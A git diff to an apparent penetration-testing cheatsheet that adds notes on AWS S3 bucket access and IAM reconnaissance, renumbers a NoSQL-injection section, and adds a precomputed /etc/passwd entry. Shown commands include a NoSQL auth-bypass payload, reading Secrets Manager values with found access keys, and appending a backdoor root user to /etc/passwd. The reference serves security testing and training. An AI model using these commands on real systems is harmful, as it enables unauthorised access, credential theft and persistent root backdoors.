@@ -41,8 +41,13 @@ Other great cheetsheets:
     - [3.16.3. Useful MySQL Files](#3163-useful-mysql-files)
   - [3.17. 5900 - VNC Enumeration](#317-5900---vnc-enumeration)
   - [3.18. 27017 - MongoDB Enumeration](#318-27017---mongodb-enumeration)
-    - [Exploiting NoSQL Injection](#exploiting-nosql-injection)
-  - [3.19. IPv6 to bypass IPv4 filters](#319-ipv6-to-bypass-ipv4-filters)
+    - [3.18.1. Exploiting NoSQL Injection](#3181-exploiting-nosql-injection)
+  - [3.19. Amazon Web Services (AWS) S3 Buckets](#319-amazon-web-services-aws-s3-buckets)
+    - [3.19.1. AWS Identity and Access Management (IAM)](#3191-aws-identity-and-access-management-iam)
+      - [3.19.1.1. IAM Access Keys](#31911-iam-access-keys)
+      - [3.19.1.2. Conducting Reconnaissance with IAM](#31912-conducting-reconnaissance-with-iam)
+      - [3.19.1.3. AWS ARNs](#31913-aws-arns)
+  - [3.20. IPv6 to bypass IPv4 filters](#320-ipv6-to-bypass-ipv4-filters)
 - [4. Exploitation](#4-exploitation)
   - [4.1. Searchsploit](#41-searchsploit)
   - [4.2. Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
@@ -1026,7 +1031,7 @@ db.users.drop()
 - $exists
 - $regex
 
-### Exploiting NoSQL Injection
+### 3.18.1. Exploiting NoSQL Injection
 
 In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:
 
@@ -1083,8 +1088,110 @@ username=admin&password[$regex]=pass.*
 ```
 
 
+## 3.19. Amazon Web Services (AWS) S3 Buckets
 
-## 3.19. IPv6 to bypass IPv4 filters
+Format of the bucket and resource (file) in urls:
+
+```
+http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext
+http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext
+```
+
+If the buckets have ACL rules set to allow `Anyone`, then you can list the
+contents as an unauthenticated user. If the ACL allows `AuthenticatedUsers`,
+any logged-in AWS customer in the world can list the bucket contents.
+
+Listing bucket contents without being authenticated:
+
+```sh
+# over HTTP (can be done in browser)
+curl http://irs-form-990.s3.amazonaws.com/
+
+# using the AWS CLI 'ls', '--no-sign-request' means without authentication
+aws s3 ls s3://irs-form-990/ --no-sign-request
+```
+
+Downloading files from AWS Buckets without being authenticated:
+
+```sh
+# over HTTP (can be done in browser)
+curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml
+
+# using the AWS CLI 'cp', '--no-sign-request' means without authentication
+aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
+```
+
+### 3.19.1. AWS Identity and Access Management (IAM)
+
+Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.
+
+
+#### 3.19.1.1. IAM Access Keys
+
+IAM Access Keys consist of an Access Key ID and the Secret Access Key.
+
+**Access Key IDs** always begin with the letters `AKIA` and are **20 characters long**.
+These act as a user name for the AWS API.
+
+The **Secret Access Key** is **40 characters long**. AWS generates both strings;
+however, AWS doesn't make the Secret Access Key available to download after the
+initial generation.
+
+There is another type of credentials, **short-term credentials**, where the
+Access Key ID **begins with the letters `ASIA`** and includes an additional
+string called the Session Token.
+
+#### 3.19.1.2. Conducting Reconnaissance with IAM
+
+When you find credentials to AWS, you can add them to your AWS Profile in the
+AWS CLI. For this, you use the command:
+
+```sh
+aws configure --profile PROFILENAME
+```
+
+This command will add entries to the `.aws/config` and `.aws/credentials` files in your user's home directory.
+
+**ProTip**: Never store a set of access keys in the `[default]` profile (without adding the `--profile` flag). Doing so  forces you always to specify a profile and never accidentally run a  command against an account you don't intend to.
+
+
+
+A few other common AWS reconnaissance techniques are:
+
+1. Finding the Account ID belonging to an access key:
+
+   `aws sts get-access-key-info --access-key-id AKIAEXAMPLE`
+
+2. Determining the Username the access key you're using belongs to
+
+   `aws sts get-caller-identity --profile PROFILENAME`
+
+3. Listing all the EC2 instances running in an account
+
+   `aws ec2 describe-instances --output text --profile PROFILENAME`
+
+4. Listing all the EC2 instances running in an account in a different region
+   `aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME`
+
+4. Listing all secrets stored in AWS Secrets Manager for a given profile
+   `aws secretsmanager list-secrets --profile PROFILENAME`
+
+4. Reveal the encrypted contents of a secret (secrets might be region-specific).
+   `aws secretsmanager get-secret-value --secret-id <friendlyname-or-ARN> --profile PROFILENAME [--region eu-north-1]`
+
+#### 3.19.1.3. AWS ARNs
+
+An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.
+
+The format is:
+
+```
+arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>
+```
+
+
+
+## 3.20. IPv6 to bypass IPv4 filters
 
 Sometimes if you see `filtered` on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.
 
@@ -2738,6 +2845,9 @@ openssl passwd -1 -salt derp password
 echo "root2:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
 # alternatively
 echo "root2:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
+# pre-computed for password 'herpaderp':
+echo 'derp:$5$derp$uEWQFRg/9idrisiL6SgLNfSAv3.UNCc7eHUv.L1Wlo.:0:0:root:/root:/bin/bash' >> /etc/passwd
+
 # can also add generated password between the first and second colon of root user
 ```
 
